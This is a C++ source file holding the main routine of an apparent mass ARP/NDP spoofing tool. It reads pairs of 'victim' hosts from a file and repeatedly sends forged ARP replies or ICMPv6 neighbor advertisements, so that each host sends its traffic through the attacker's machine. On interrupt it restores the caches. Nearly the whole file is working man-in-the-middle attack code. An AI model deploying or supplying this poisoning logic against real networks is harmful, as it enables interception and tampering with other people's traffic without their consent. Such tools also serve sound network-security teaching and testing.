#include <cstdlib>
#include <iostream>
#include <unistd.h>
#include <signal.h>
#include "ARP_packet.h"
#include "NetworkInterface.h"
#include "PacketManager.h"
#include "ICMPv6_packet.h"
#include "MassSpoofArguments.h"
#include "SetOfHosts.h"

bool loop = true;

void interruptHandler(int sig);

int main(int argc, char **argv) {
    try {
        MassSpoofArguments arguments(argc, argv);
        NetworkInterface networkInterface(arguments.getInterface());
        PacketManager<ARP_packet> arpPacketManager(networkInterface, "arp");
        PacketManager<ICMPv6_packet> icmpv6PacketManager(networkInterface, "icmp6");

        signal(SIGINT, interruptHandler);
        signal(SIGTERM, interruptHandler);

        SetOfHosts hostsList(arguments.getFilename());
        set<Group> groupsOfVictims = hostsList.getGroups();
        if (!SetOfHosts::hasEveryGroupExactlyTwoHosts(groupsOfVictims)) {
            throw runtime_error("Every group must have exactly 2 hosts!");
        }

        if (groupsOfVictims.size() == 0)
            return EXIT_SUCCESS;

        if (arguments.getProtocol() == "arp") {
            for (auto &group : groupsOfVictims) {
                if (group.getHosts()[0].getIpv4addresses().size() == 0 ||
                    group.getHosts()[1].getIpv4addresses().size() == 0) {
                    throw runtime_error(string("Every host in every group must have at least 1 IPv4 address ") +
                                        "when performing ARP cache poisoning");
                }
            }

            // Perform ARP cache poison
            while (loop) {
                for (auto &group : groupsOfVictims) {
                    for (auto &victim1IPv4addr : group.getHosts()[0].getIpv4addresses()) {
                        ARP_packet *arpReply = ARP_packet::createReply(
                                networkInterface.getHost()->getMacAddress(),
                                victim1IPv4addr.first,
                                group.getHosts()[1].getMacAddress(),
                                (*(group.getHosts()[1].getIpv4addresses().begin())).first
                        );
                        arpPacketManager.send(arpReply);
                        delete arpReply;
                        usleep(1);
                    }
                    for (auto &victim2IPv4addr : group.getHosts()[1].getIpv4addresses()) {
                        ARP_packet *arpReply = ARP_packet::createReply(
                                networkInterface.getHost()->getMacAddress(),
                                victim2IPv4addr.first,
                                group.getHosts()[0].getMacAddress(),
                                (*(group.getHosts()[0].getIpv4addresses().begin())).first
                        );
                        arpPacketManager.send(arpReply);
                        delete arpReply;
                        usleep(1);
                    }
                }
                usleep((__useconds_t) (arguments.getTime() * 1000));
            }

            // Reset APR cache tables
            for (auto &group : groupsOfVictims) {
                for (auto &victim1IPv4addr : group.getHosts()[0].getIpv4addresses()) {
                    ARP_packet *arpReply = ARP_packet::createReply(
                            group.getHosts()[0].getMacAddress(),
                            victim1IPv4addr.first,
                            group.getHosts()[1].getMacAddress(),
                            (*(group.getHosts()[1].getIpv4addresses().begin())).first
                    );
                    arpPacketManager.send(arpReply);
                    delete arpReply;
                    usleep(1);
                }
                for (auto &victim2IPv4addr : group.getHosts()[1].getIpv4addresses()) {
                    ARP_packet *arpReply = ARP_packet::createReply(
                            group.getHosts()[1].getMacAddress(),
                            victim2IPv4addr.first,
                            group.getHosts()[0].getMacAddress(),
                            (*(group.getHosts()[0].getIpv4addresses().begin())).first
                    );
                    arpPacketManager.send(arpReply);
                    delete arpReply;
                    usleep(1);
                }
            }
        } else {
            for (auto &group : groupsOfVictims) {
                if (group.getHosts()[0].getIpv6addresses().size() == 0 ||
                    group.getHosts()[1].getIpv6addresses().size() == 0) {
                    throw runtime_error(string("Every host in every group must have at least 1 IPv6 address ") +
                                        "when performing NDP cache poisoning");
                }
            }

            // Perform NDP cache poison
            while (loop) {
                for (auto &group : groupsOfVictims) {
                    for (auto &victim1IPv6addr : group.getHosts()[0].getIpv6addresses()) {
                        ICMPv6_packet *neighborAdvertisement = ICMPv6_packet::createNeighborAdvertisement(
                                networkInterface.getHost()->getMacAddress(),
                                victim1IPv6addr,
                                group.getHosts()[1].getMacAddress(),
                                *(group.getHosts()[1].getIpv6addresses().begin())
                        );
                        icmpv6PacketManager.send(neighborAdvertisement);
                        delete neighborAdvertisement;
                        usleep(1);
                    }
                    for (auto &victim2IPv6addr : group.getHosts()[1].getIpv6addresses()) {
                        ICMPv6_packet *neighborAdvertisement = ICMPv6_packet::createNeighborAdvertisement(
                                networkInterface.getHost()->getMacAddress(),
                                victim2IPv6addr,
                                group.getHosts()[0].getMacAddress(),
                                *(group.getHosts()[0].getIpv6addresses().begin())
                        );
                        icmpv6PacketManager.send(neighborAdvertisement);
                        delete neighborAdvertisement;
                        usleep(1);
                    }
                }
                usleep((__useconds_t) (arguments.getTime() * 1000));
            }

            // Reset NDP cache tables
            for (auto &group : groupsOfVictims) {
                for (auto &victim1IPv6addr : group.getHosts()[0].getIpv6addresses()) {
                    ICMPv6_packet *neighborAdvertisement = ICMPv6_packet::createNeighborAdvertisement(
                            group.getHosts()[0].getMacAddress(),
                            victim1IPv6addr,
                            group.getHosts()[1].getMacAddress(),
                            *(group.getHosts()[1].getIpv6addresses().begin())
                    );
                    icmpv6PacketManager.send(neighborAdvertisement);
                    delete neighborAdvertisement;
                    usleep(1);
                }
                for (auto &victim2IPv6addr : group.getHosts()[1].getIpv6addresses()) {
                    ICMPv6_packet *neighborAdvertisement = ICMPv6_packet::createNeighborAdvertisement(
                            group.getHosts()[1].getMacAddress(),
                            victim2IPv6addr,
                            group.getHosts()[0].getMacAddress(),
                            *(group.getHosts()[0].getIpv6addresses().begin())
                    );
                    icmpv6PacketManager.send(neighborAdvertisement);
                    delete neighborAdvertisement;
                    usleep(1);
                }
            }
        }
    }
    catch (InvalidArgumentsException &e) {
        cerr << e.what() << endl;
        MassSpoofArguments::printUsage();
        return EXIT_FAILURE;
    }
    catch (exception &e) {
        cerr << e.what() << endl;
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

void interruptHandler(int sig) {
    loop = false;
}